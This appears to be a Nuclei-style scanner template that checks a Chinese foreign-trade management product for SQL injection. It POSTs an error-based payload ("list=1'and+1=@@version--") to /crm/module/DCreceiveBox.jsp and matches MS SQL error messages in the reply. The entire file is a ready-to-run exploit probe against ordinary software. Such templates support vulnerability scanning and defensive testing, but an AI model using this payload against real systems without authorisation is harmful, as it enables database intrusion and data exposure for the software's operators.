id: poc-yaml-51boss-list-sqli
info:
  name: 博斯外贸管理软件 list SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
http:
  - method: POST
    path:
      - "{{BaseURL}}/crm/module/DCreceiveBox.jsp"
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    body: "list=1'and+1=@@version--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "java.sql.SQLException"
          - "Microsoft SQL Server"
      - type: regex
        regex:
          - "转换为数据类型为"
          - "发生语法错误"
        part: body
